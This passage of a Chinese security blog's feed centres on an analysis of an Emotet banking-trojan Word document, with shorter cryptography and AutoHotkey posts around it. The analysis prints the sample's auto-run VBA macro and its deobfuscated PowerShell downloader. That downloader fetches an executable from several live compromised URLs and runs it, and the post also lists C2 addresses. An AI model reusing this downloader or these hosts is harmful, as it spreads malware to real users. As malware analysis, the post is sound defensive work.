rel="noopener">https://www.kancloud.cn/kancloud/rsa_algorithm/48484</a></p><p><a href="https://juejin.im/entry/5b1bab6b6fb9a01e605fcddd" target="_blank" rel="noopener">https://juejin.im/entry/5b1bab6b6fb9a01e605fcddd</a></p><p><a href="https://cloud.tencent.com/developer/article/1040293" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1040293</a></p><p><a href="https://www.cnblogs.com/starwolf/p/3365834.html" target="_blank" rel="noopener">https://www.cnblogs.com/starwolf/p/3365834.html</a></p><p><a href="https://github.com/matt-wu/AES/blob/master/README.md" target="_blank" rel="noopener">https://github.com/matt-wu/AES/blob/master/README.md</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向基础" scheme="http://xwdidi.top/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="密码学" scheme="http://xwdidi.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Emotet后台pe木马较不完整分析</title>
    <link href="http://xwdidi.top/2019/10/24/2019-10-24-pe%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://xwdidi.top/2019/10/24/2019-10-24-pe木马分析/</id>
    <published>2019-10-23T16:00:00.000Z</published>
    <updated>2019-11-28T14:44:43.535Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>2019-11-07</p><p><code>ioc</code>规则提交给微步时,顺便把恶意<code>ip</code>搜索了一下,发现<code>Emotet</code>银行木马家族.</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下最近分析的一个样本,自己依然是个菜鸡,有很多不足,希望各位师傅提出错误我努力学习.我头发都没了.此木马发送用户信息加密,能进行远程后门访问等功能,导入函数和导出函数只有一个,大量的动态加载api. </p><p>idb和样本都放下面学习链接那了.</p><h2 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h2><ul><li>样本名称: f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282-1571228285.doc</li><li>样本大小:  182,784</li><li>MD5:  b72f31807db78e70eb2c45993dd2a4e1</li><li>SHA-256: c1fff4d580677f66da1841e882d94f17bc04068d</li><li>SHA-1: f7df4126d9ae958be542583f0da746c4097bcc33b743a7af3896a3292de52282</li><li>样本来源:  <a href="https://app.any.run/tasks/62240da8-9741-45ff-8c12-b26d704a6145/" target="_blank" rel="noopener">https://app.any.run/tasks/62240da8-9741-45ff-8c12-b26d704a6145/</a></li></ul><h2 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h2><ul><li>环境: VMware15 , Win10 专业版, Office 365</li></ul><h2 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h2><p><img src="https://i.loli.net/2019/10/21/Njwsd3ZYCkHugeq.png" alt="image.png"></p><h2 id="0x04-详细分析"><a href="#0x04-详细分析" class="headerlink" title="0x04 详细分析"></a>0x04 详细分析</h2><h3 id="一-打开doc-宏代码"><a href="#一-打开doc-宏代码" class="headerlink" title="一. 打开doc,宏代码"></a>一. 打开doc,宏代码</h3><p><code>Alt+F11</code>查看调试宏代码</p><p>三个模块分别为<code>Pibafqel</code>,<code>Nzolhtmfybml</code>,<code>Xhnbvwxbzhq</code>.<code>Nzolhtmfybml</code>里面是空的,其他两个里面充满类似家庭地址的注释,使用脚本删除掉后进行调试翻译.去除无用混淆,大多数都只是定义,声明的函数.</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> XXX()</span><br><span class="line">            ;这种格式表示一个函数</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen() </span><br><span class="line">            ;运行文档时候，自动运行宏</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>调试后发现,在<code>autoopen</code>中使用过函数有<code>Hsbahypqju()</code>和<code>Abiufkgnjgdiv(Kmtifafrucqb)</code>.</p><p>化简:<img src="https://i.loli.net/2019/10/18/pR8JMlgx3KU1Ci9.png" alt="image.png"></p><h4 id="autopen"><a href="#autopen" class="headerlink" title="autopen()"></a>autopen()</h4><p>调用<code>Hsbahypqju()</code>,</p><h4 id="Hsbahypqju"><a href="#Hsbahypqju" class="headerlink" title="Hsbahypqju()"></a>Hsbahypqju()</h4><p>遇到个office坑比的地方,通过监视窗口只能查看前250个字符,所以最好通过<code>Debug.Print</code>打印变量,能看到全部字符串</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Hsbahypqju()</span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> Dtzjcfqgj = <span class="built_in">CreateObject</span>(<span class="string">"winmgmts:win32_processstartup"</span>)</span><br><span class="line">Dtzjcfqgj.ShowWindow = <span class="number">0</span>#</span><br><span class="line">    Thbjfvedxuqm = <span class="string">"powershell -e &lt;# https://www.microsoft.com/ #&gt; $Eywrqrdqbmw='Rzhvtqwrc';$Jcwhciloutn = '846';$Ctyrqdpzavru='Wixhqavur';$Bpaqqzwo=$env:userprofile+'\'+$Jcwhciloutn+'.exe';$Yawfxccmy='Ezlignhvinnmt';$Tlvpwcruuo=.('new-'+'obj'+'ect') NEt.WebClIENT;$Jznyrpyuqf='http://complaintboardonline.com/wp-admin/qekr3925/*https://frazischool.com/wp-includes/ozi2y6740/*https://sagarngofoundation.com/jxc5c/q54824/*https://naturerepublickh.com/test/wvvqa9/*https://watonlight.com/wp-admin/wa31628/'."</span>sp`LiT<span class="string">"('*');$Ufiwicmkrdst='Ohjtzdywhuim';foreach($Lygaeckfk in $Jznyrpyuqf)&#123;try&#123;$Tlvpwcruuo."</span>d`OwNLoa`D`FILE<span class="string">"($Lygaeckfk, $Bpaqqzwo);$Tlncrdhw='Fvsotfnt';If ((&amp;('G'+'et-It'+'em') $Bpaqqzwo)."</span>LE`NgtH<span class="string">" -ge 23622) &#123;[Diagnostics.Process]::"</span>s`TARt<span class="string">"($Bpaqqzwo);$Getujvyyonwg='Gppbzmrdhoel';break;$Cgphukmh='Hhiypojok'&#125;&#125;catch&#123;&#125;&#125;$Pyreoccwfqy='Whyolyeyvhts'"</span></span><br><span class="line"><span class="keyword">Set</span> Ywlbxgbmzrxh = <span class="built_in">CreateObject</span>(<span class="string">"winmgmts:Win32_Process"</span>)</span><br><span class="line">Finrmepurj = Ywlbxgbmzrxh.Create(Thbjfvedxuqm, Ncrmxklxbct, Dtzjcfqgj, Pxajxegluaugg) </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><ol><li><p>创建一个<code>winmgmts:win32_processstartup</code>对象,仅用于将信息传递给<a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener"><strong>Win32_Process</strong></a>类的<a href="https://docs.microsoft.com/zh-cn/windows/win32/cimwin32prov/create-method-in-class-win32-process" target="_blank" rel="noopener"><strong>Create</strong></a>方法。</p></li><li><p>隐藏窗口</p></li><li><p>命令行字符串</p></li><li><p>创建<code>winmgmts:Win32_Process</code>对象</p></li><li><p>通过<code>Win32_Process</code>方法<code>Creat</code>运行字符串.<code>-e</code>为<code>-EncodeCommand</code>.<code>powershell -e</code>运行base64编码的字符串.</p><p>Create(命令行,子进程路径,启动配置,进程od)`</p></li></ol><h4 id="Abiufkgnjgdiv-Kmtifafrucqb"><a href="#Abiufkgnjgdiv-Kmtifafrucqb" class="headerlink" title="Abiufkgnjgdiv(Kmtifafrucqb)"></a>Abiufkgnjgdiv(Kmtifafrucqb)</h4><p>将传入的字符串中的<code>0xdc3</code>替换为空,恢复字符串的作用.</p><h3 id="二-PowerShell脚本分析"><a href="#二-PowerShell脚本分析" class="headerlink" title="二. PowerShell脚本分析"></a>二. PowerShell脚本分析</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Eywrqrdqbmw</span>=<span class="string">'Rzhvtqwrc'</span>;</span><br><span class="line"><span class="variable">$Jcwhciloutn</span> = <span class="string">'846'</span>;</span><br><span class="line"><span class="variable">$Ctyrqdpzavru</span>=<span class="string">'Wixhqavur'</span>;</span><br><span class="line"><span class="variable">$Bpaqqzwo</span>=<span class="string">"%userprofile%\846.exe"</span>;</span><br><span class="line"><span class="variable">$Yawfxccmy</span>=<span class="string">'Ezlignhvinnmt'</span>;</span><br><span class="line"><span class="variable">$Tlvpwcruuo</span>=.(<span class="string">'new-object'</span>) NEt.WebClIENT;</span><br><span class="line"><span class="variable">$Jznyrpyuqf</span>=<span class="string">'http://complaintboardonline.com/wp-admin/qekr3925/*https://frazischool.com/wp-includes/ozi2y6740/*https://sagarngofoundation.com/jxc5c/q54824/*https://naturerepublickh.com/test/wvvqa9/*https://watonlight.com/wp-admin/wa31628/'</span>.<span class="string">"spLiT"</span>(<span class="string">'*'</span>);</span><br><span class="line"><span class="variable">$Ufiwicmkrdst</span>=<span class="string">'Ohjtzdywhuim'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$Lygaeckfk</span> <span class="keyword">in</span> <span class="variable">$Jznyrpyuqf</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$Tlvpwcruuo</span>.<span class="string">"dOwNLoaDFILE"</span>(<span class="variable">$Lygaeckfk</span>, <span class="variable">$Bpaqqzwo</span>);</span><br><span class="line"><span class="variable">$Tlncrdhw</span>=<span class="string">'Fvsotfnt'</span>;</span><br><span class="line"><span class="keyword">If</span> ((&amp;(<span class="string">'Get-Item'</span>) <span class="variable">$Bpaqqzwo</span>).<span class="string">"LENgtH"</span> <span class="nomarkup">-ge</span> <span class="number">23622</span>) &#123;</span><br><span class="line">[Diagnostics.Process]::<span class="string">"sTARt"</span>(<span class="variable">$Bpaqqzwo</span>);</span><br><span class="line"><span class="variable">$Getujvyyonwg</span>=<span class="string">'Gppbzmrdhoel'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="variable">$Cgphukmh</span>=<span class="string">'Hhiypojok'</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Pyreoccwfqy</span>=<span class="string">'Whyolyeyvhts'</span></span><br></pre></td></tr></table></figure><ol><li>创建<code>WebClient</code>对象</li><li>调用<code>downloadfile</code>方法通过用<code>*</code>分割好的数组的链接遍历下载文件并存储为<code>%userprofile%\846.exe</code></li><li>如果长度大于23622,则启动<code>846.exe</code>程序.</li><li>最后一个网址疑似被挂马,可能已被入侵作为传播中转站.</li></ol><h3 id="三-846-exe"><a href="#三-846-exe" class="headerlink" title="三. 846.exe"></a>三. 846.exe</h3><p>位置: %userprofile%\846.exe</p><p>名称: 846.exe</p><p>md5: e83c5ba6be05ec51ae6ceb2470fcfdf3</p><p>sha-1: 94b527756b6c6753822501f76f161bf64ad6974c</p><p>sha-256: fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7</p><p><img src="https://i.loli.net/2019/10/22/BTgSAonUl9yt8hj.png" alt="image.png"></p><p>时间是最近创建的.无壳,使用vs2015编译.</p><h4 id="0x01行为分析"><a href="#0x01行为分析" class="headerlink" title="0x01行为分析"></a>0x01行为分析</h4><p>根据<code>ProcessExplorer</code>观察程序执行大概流程.<code>846.exe</code>执行后会启动一个新进程 后杀掉自己.新进程名为<code>dasmrcdasmrc.exe</code>,地址为<code>%LOCALAPPDATA%\dasmrcdasmrc.exe</code></p><p><img src="https://i.loli.net/2019/10/19/HTRUwcAivas2org.png" alt="image.png"></p><h4 id="0x02-详细分析"><a href="#0x02-详细分析" class="headerlink" title="0x02 详细分析"></a>0x02 详细分析</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>存在唯一的导出函数<code>qzLgKZBqfCXorfLMeJzdKzgyvdzqwF</code>,<code>EntryPoint</code>为<code>0x00004960</code></p><p><code>CIRC OLE Control DLL</code>可能某个样本种类吧.</p><h5 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h5><h6 id="0x01-Winmain"><a href="#0x01-Winmain" class="headerlink" title="0x01 Winmain"></a>0x01 Winmain</h6><p><img src="https://i.loli.net/2019/10/20/NcUVFW846Dnsdpu.png" alt="image.png"></p><p>通过导出表获取函数<code>qzLgKZBqfCXorfLMeJzdKzgyvdzqwF</code>的地址,跳转执行.</p><h6 id="0x02-导出函数-qzLgKZBqfCXorfLMeJzdKzgyvdzqwF"><a href="#0x02-导出函数-qzLgKZBqfCXorfLMeJzdKzgyvdzqwF" class="headerlink" title="0x02 导出函数 qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()"></a>0x02 导出函数 qzLgKZBqfCXorfLMeJzdKzgyvdzqwF()</h6><p><img src="https://i.loli.net/2019/10/19/SpXs2N7LhHjlxae.png" alt="image.png"></p><p>获取<code>VirtualAlloc</code>函数地址,以使得后续能拷贝执行数据.</p><p><img src="https://i.loli.net/2019/10/20/1zagy6WxLV5qbUe.png" alt="image.png"></p><h6 id="0x03-解密数据执行"><a href="#0x03-解密数据执行" class="headerlink" title="0x03 解密数据执行"></a>0x03 解密数据执行</h6><p><img src="https://i.loli.net/2019/10/20/G68gUqlMVekoZPD.png" alt="image.png"></p><ol><li><p><code>sub_1E0467</code>函数通过传如对应函数<code>hash</code>值获取所需api地址.</p><p>sub_1e0467:<img src="https://i.loli.net/2019/10/20/umYZlpwNtLsWyh8.png" alt="image.png"></p><p><code>(((FS:[30])+0xC)+0xC)</code>获取<code>Ldr</code>的地址,后面进行遍历和比较最终得到所需要的地址. 参考链接放在下面了.</p><p><img src="https://i.loli.net/2019/10/20/MWcG5X49TLRKm2k.png" alt="image.png"></p><p>根据<code>PE</code>偏移,获取各个节的数据.</p><p><img src="https://i.loli.net/2019/10/20/ZqJdnRFG1a58zuL.png" alt="image.png"></p></li><li><p>申请空间</p><p><img src="https://i.loli.net/2019/10/20/BnvoZT7Qj2tHrcl.png" alt="image.png"></p></li><li><p>拷贝后门程序<code>pe</code>数据.这时候顺便去dump内存被复制的pe数据,(毕竟可能不用修复重定位(x).</p><p><img src="https://i.loli.net/2019/10/21/sag2pfOBJl4Xjer.png" alt="age.png">得知程序入口RVA为<code>0x1000</code>, 基地址为<code>0x60000</code>,所以起始地址为<code>0x610000</code>,块大小为<code>D200</code></p></li><li><p>内存页属性修改</p><p>修改代码段为可执行可读属性.</p><p><img src="https://i.loli.net/2019/10/20/K2k3H8cbLZtf4IX.png" alt="image.png"></p><p>​    修改数据段为可读属性</p><p><img src="https://i.loli.net/2019/10/20/K2k3H8cbLZtf4IX.png" alt="image.png"></p></li><li><p>执行新pe文件的代码段,这时候顺便dump下来pe数据.</p><p><img src="https://i.loli.net/2019/10/21/iqM9bLgCnea3HZd.png" alt="image.png"></p></li></ol><h6 id="0x04-内存pe执行"><a href="#0x04-内存pe执行" class="headerlink" title="0x04 内存pe执行"></a>0x04 内存pe执行</h6><ol><li><p>拷贝数据</p><p><img src="https://i.loli.net/2019/10/22/USjyGrmZscb65WH.png" alt="image.png"></p></li><li><p>获取模块全称和地址</p><p><img src="https://i.loli.net/2019/10/21/zDvtGSpbCxBrAh4.png" alt="image.png"></p></li><li><p>计算key</p><p><img src="https://i.loli.net/2019/10/22/KomgIQ1Cl3J62Fr.png" alt="image.png"></p></li><li><p>格式化参数</p><p><img src="https://i.loli.net/2019/10/22/pxGhAcSVIn1gHmb.png" alt="image.png"></p></li><li><p>计算出的命令行参数和从右往左取现有命令行进行比较,如果命令相等则执行内部函数.不相等的话执行下列流程</p><p><img src="https://i.loli.net/2019/10/21/xtZ1VL8AzhvXHbi.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/21/gbc4lvu9BhtA6qJ.png" alt="image.png"></p></li><li><p>不相等后</p><p>执行后续程序,最终<code>CreateProcessW</code></p><p>创建新的自身进程并附加对应计算出的命令参数:<br><img src="https://i.loli.net/2019/10/21/Nto42xPCwM19S8z.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/10/21/qTyEN2M5O3VaxkF.png" alt="image.png"></p></li><li><p>退出进程</p><p><img src="https://i.loli.net/2019/10/21/E41zgYRTi3nZJyG.png" alt="image.png"></p></li></ol><h6 id="0x05-主要功能"><a href="#0x05-主要功能" class="headerlink" title="0x05 主要功能"></a>0x05 主要功能</h6><h6 id><a href="#" class="headerlink" title></a><img src="https://i.loli.net/2019/10/21/gTuZNbcDyrnVJEf.png" alt="image.png"></h6><p>使用上述的命令行字符串进行调试,这时候为了方便使用之前解密后dump下来的pe数据.</p><p>二者字符串相等进入<code>sub_30B8AB</code>.</p><p><img src="https://i.loli.net/2019/10/24/XSZhrkpJOo4zIFB.png" alt="image.png"></p><p>通过互斥量执行主要功能函数函数,等待<code>4000ms</code></p><p><img src="https://i.loli.net/2019/10/24/BcQegxCy5mJIvq8.png" alt="image.png"></p><p>功能大致分布区域,通过对固定内存空间的值进行校验赋值,依次执行不同功能</p><ol><li><p>系统进程获取</p><p><img src="https://i.loli.net/2019/10/24/tYqLebN5KmjS3lT.png" alt="image.png"></p><p><code>sub_302255</code><img src="https://i.loli.net/2019/10/24/SdyeljR6A5rpo8O.png" alt="image.png"></p><p>进程名存储:<img src="https://i.loli.net/2019/10/23/lM42Ns8oqFrZOHh.png" alt="image.png"></p></li><li><p>信息发送</p><p><img src="https://i.loli.net/2019/10/24/FatXzjZlEN9Lco6.png" alt="image.png"></p><p>发送流程</p><p><img src="https://i.loli.net/2019/10/24/T6hCc8joDS2UHwg.png" alt="image.png"></p></li><li><p>注册自启动</p><p><img src="https://i.loli.net/2019/10/24/I5HK64yL21sqhNm.png" alt="image.png"></p></li><li><p>新文件</p><p><img src="https://i.loli.net/2019/10/24/jYRchepluf3CWEO.png" alt="image.png"></p><p>启动<img src="https://i.loli.net/2019/10/24/21x6OJq9XuA4zwN.png" alt="image.png"></p></li><li><p>令牌获取</p><p><img src="https://i.loli.net/2019/10/24/cJhGPRE3abTzV2W.png" alt="image.png"></p><p>高权限执行</p><p><img src="https://i.loli.net/2019/10/24/K4S9RY8EmUjawpk.png" alt="image.png"></p></li><li><p>移动文件</p><p><img src="https://i.loli.net/2019/10/24/p9lZFEDwT8HWtq2.png" alt="image.png"></p><p>使用<code>SHFileOperationW</code>操作文件</p><p><img src="https://i.loli.net/2019/10/24/cFmnrQpLTHCx4IU.png" alt="image.png"></p></li></ol><h3 id="四-dasmrcdasmrc-exe"><a href="#四-dasmrcdasmrc-exe" class="headerlink" title="四. dasmrcdasmrc.exe"></a>四. dasmrcdasmrc.exe</h3><p>位置: %localappdata%\dasmrcdasmrc\dasmrcdasmrc.exe</p><p>名称: dasmrcdasmrc.exe</p><p>md5: e83c5ba6be05ec51ae6ceb2470fcfdf3</p><p>sha-1: 94b527756b6c6753822501f76f161bf64ad6974c</p><p>sha-256: fb0a0f10cbebefb5dbe6034c3bdfe246179e444c68a6e36c4d20232d52fc07a7</p><p> 和846同一文件,并执行了木马函数.</p><h2 id="0x05-恶意ip"><a href="#0x05-恶意ip" class="headerlink" title="0x05 恶意ip"></a>0x05 恶意ip</h2><p>通过<code>fiddler</code>,发包可知恶意流量ip地址.</p><p><img src="https://i.loli.net/2019/10/21/VB3IYgWGQEMzi6y.png" alt></p><h2 id="0x06-IOC"><a href="#0x06-IOC" class="headerlink" title="0x06 IOC"></a>0x06 IOC</h2><p>MD5</p><p>b72f31807db78e70eb2c45993dd2a4e1 </p><p>e83c5ba6be05ec51ae6ceb2470fcfdf3</p><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><table><thead><tr><th><a href="javascript:" target="_blank" rel="noopener">complaintboardonline.com</a></th><th><a href="http://ip.tool.chinaz.com/?ip=35.200.131.105" target="_blank" rel="noopener">35.200.131.105</a></th></tr></thead><tbody><tr><td><a href="javascript:" target="_blank" rel="noopener">watonlight.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=144.34.202.247" target="_blank" rel="noopener">144.34.202.247</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">frazischool.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=103.241.24.165" target="_blank" rel="noopener">103.241.24.165</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">sagarngofoundation.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=35.154.167.80" target="_blank" rel="noopener">35.154.167.80</a></td></tr><tr><td><a href="javascript:" target="_blank" rel="noopener">naturerepublickh.com</a></td><td><a href="http://ip.tool.chinaz.com/?ip=103.91.65.133" target="_blank" rel="noopener">103.91.65.133</a></td></tr></tbody></table><table><thead><tr><th>http:\\</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>14.160.93.230</td><td style="text-align:center">/forced/ringin/</td></tr><tr><td>74.208.68.48:8080</td><td style="text-align:center">/attrib/srvc/symbols/merge/</td></tr><tr><td>104.131.58.132:8080</td><td style="text-align:center">/report/publish/symbols/merge/</td></tr><tr><td>68.183.190.199:8080</td><td style="text-align:center">/xian/schema/symbols/merge/</td></tr><tr><td>62.75.143.100:7080</td><td style="text-align:center">/report/</td></tr><tr><td>159.203.204.126:8080</td><td style="text-align:center">/devices/mult/</td></tr><tr><td>151.80.142.33</td><td style="text-align:center">/symbols/enable/symbols/</td></tr><tr><td>123.168.4.66:22</td><td style="text-align:center">/report/iplk/</td></tr><tr><td>46.28.111.142:7080</td><td style="text-align:center">/merge/psec/symbols/merge/</td></tr><tr><td>46.101.212.195:8080</td><td style="text-align:center">/symbols/badge/</td></tr><tr><td>183.82.97.25</td><td style="text-align:center">/between/balloon/symbols/merge/</td></tr><tr><td>190.10.194.42:8080</td><td style="text-align:center">/balloon/health/symbols/merge/</td></tr><tr><td>217.199.160.224:8080</td><td style="text-align:center">/json/site/</td></tr><tr><td>186.1.41.111:443</td><td style="text-align:center">/bml/splash/symbols/merge/</td></tr><tr><td>185.86.148.222:8080</td><td style="text-align:center">/results/teapot/symbols/</td></tr><tr><td>185.187.198.10:8080</td><td style="text-align:center">/results/walk/</td></tr><tr><td>200.57.102.71:8443</td><td style="text-align:center">/scripts/</td></tr><tr><td>114.79.134.129:443</td><td style="text-align:center">/guids/</td></tr></tbody></table><h2 id="学习链接与资源"><a href="#学习链接与资源" class="headerlink" title="学习链接与资源"></a>学习链接与资源</h2><p><a href="https://github.com/Xuwei98/malware-analysis/tree/master/Trojan/2019-10-18-word-pe木马" target="_blank" rel="noopener">样本和idb放这里了</a></p><p><a href="https://green-m.me/2018/04/26/find-api-adress-by-hash/" target="_blank" rel="noopener">通过Hash查找API函数地址</a></p><p><a href="https://blog.csdn.net/anda0109/article/details/50013523" target="_blank" rel="noopener">CryptoAPI</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="样本分析" scheme="http://xwdidi.top/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="恶意软件" scheme="http://xwdidi.top/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
      <category term="PE" scheme="http://xwdidi.top/tags/PE/"/>
    
      <category term="宏代码" scheme="http://xwdidi.top/tags/%E5%AE%8F%E4%BB%A3%E7%A0%81/"/>
    
      <category term="PowerShell" scheme="http://xwdidi.top/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>Autohotkey脚本,自用</title>
    <link href="http://xwdidi.top/2019/10/17/2019-10-17-autohotkey/"/>
    <id>http://xwdidi.top/2019/10/17/2019-10-17-autohotkey/</id>
    <published>2019-10-16T16:00:00.000Z</published>
    <updated>2020-01-13T07:24:45.022Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="注册表切换键位"><a href="#注册表切换键位" class="headerlink" title="注册表切换键位"></a>注册表切换键位</h3><p><code>Esc</code>和<code>CapsLock</code>相互映射.在任何键盘都是可以使用的.毕竟注册表优先级更高.</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>本质来说是使用注册表中的扫描码映射<code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]</code></p><p><code>Esc</code>和<code></code>CapsLock`相互映射,可以这样写:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]</span><br><span class="line"> <span class="string">"Scancode Map"</span>=hex:<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">03</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">3</span>a,<span class="number">00</span>,<span class="number">01</span>,<span class="number">00</span>,<span class="number">01</span>,<span class="number">00</span>,<span class="number">3</span>a,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span></span><br></pre></td></tr></table></figure><p>当然原理是这样的,我是用的是<code>SharpKeys</code>,开源链接在下方.</p><h3 id="AutoHotKey"><a href="#AutoHotKey" class="headerlink" title="AutoHotKey"></a>AutoHotKey</h3><p>使用软件<code>AutoHotKey</code>进行热键设置,下面是我现在使用的脚本.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">; + shift</span><br><span class="line">; ! Alt</span><br><span class="line">; ^ crtl</span><br><span class="line">; # win</span><br><span class="line"></span><br><span class="line">!F10::</span><br><span class="line">Send &#123;Volume_Down&#125;</span><br><span class="line">return</span><br><span class="line">!F11::</span><br><span class="line">Send &#123;Volume_Up &#125;</span><br><span class="line">Return</span><br><span class="line">!F12::</span><br><span class="line">Send &#123;Volume_Mute&#125;</span><br><span class="line">Return</span><br><span class="line"></span><br><span class="line">Esc::Send, &#123;Esc&#125;</span><br><span 